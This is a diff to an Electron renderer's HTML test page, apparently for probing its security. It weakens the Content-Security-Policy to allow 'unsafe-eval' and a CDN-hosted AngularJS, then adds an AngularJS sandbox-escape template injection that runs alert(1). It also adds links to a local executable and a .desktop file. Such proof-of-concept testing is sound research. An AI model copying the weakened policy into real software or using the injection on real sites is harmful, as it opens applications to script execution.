@@ -5,20 +5,28 @@
     <!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP -->
     <meta
       http-equiv="Content-Security-Policy"
-      content="default-src 'self'; script-src 'self'"
+      content="script-src 'self' 'unsafe-eval' https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"
     />
     <meta
       http-equiv="X-Content-Security-Policy"
       content="default-src 'self'; script-src 'self'"
     />
+
     <title>Hello from Electron renderer!</title>
     <script src=./script.js></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
   </head>
   <body>
+
+    <div ng-app>
+        {{constructor.constructor('alert(1)')()}}
+    </div>
     <h1>Hello from Electron renderer!</h1>
     <p>👋</p>
     <p>This <a href="https://google.com">link</a> is allowed</p>
-    <p>This <a href="/usr/bin/obsidian">link</a> is not allowed</p>
+    <p>This <a href="/usr/bin/qalculate-gtk">link</a> is a local GTK Application file</p>
+    <p>This <a href="/usr/share/applications/qalculate-gtk.desktop">link</a> is a local .desktop file</p>
+    <p>This <a href="mailto:lacklat.key@gmail.com">link</a> is mailto link</p>
     <form id="status">
         <input type="text"></input>
         <input type="submit" value="hack"></input>
